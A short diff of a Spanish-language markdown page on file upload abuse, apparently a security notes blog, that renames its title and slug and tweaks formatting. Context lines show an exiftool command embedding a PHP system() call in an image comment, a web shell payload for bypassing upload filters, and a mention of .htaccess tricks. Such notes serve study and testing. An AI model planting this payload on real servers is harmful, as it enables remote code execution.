@@ -1,9 +1,8 @@
 ---
-title: 'File upload abuse'
+title: 'File upload'
 description: 'Hay muchas maneras en que se puede abusar de las cargas de archivos el las aplicaciónes.'
 pubDate: 'Jul 08 2022'
-slug: 'trip/file_upload_abuse'
-
+slug: 'vuln/file_upload'
 ---
 
 ## .htaccess
@@ -82,7 +81,7 @@ exiftool -Comment='<?php system("id"); ?>' foto.gif
 
 ```
 
-usando *nc* podemos conectarnos .
+usando _nc_ podemos conectarnos .
 
 ```bash
 nc google.com
